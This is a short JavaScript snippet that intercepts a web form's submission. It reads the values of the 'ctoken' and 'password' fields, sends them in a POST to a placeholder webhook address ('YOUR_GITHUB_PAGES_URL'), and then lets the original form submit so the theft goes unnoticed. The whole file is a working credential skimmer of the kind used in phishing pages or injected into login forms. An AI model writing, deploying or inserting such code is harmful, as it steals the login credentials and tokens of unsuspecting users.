document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    form.addEventListener('submit', function(event) {
        event.preventDefault();

        const username = document.querySelector('input[name="ctoken"]').value;
        const password = document.querySelector('input[name="password"]').value;

        fetch('https://YOUR_GITHUB_PAGES_URL/webhook', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        }).then(response => {
            if (response.ok) {
                form.submit(); // Submit the original form
            }
        });
    });
});
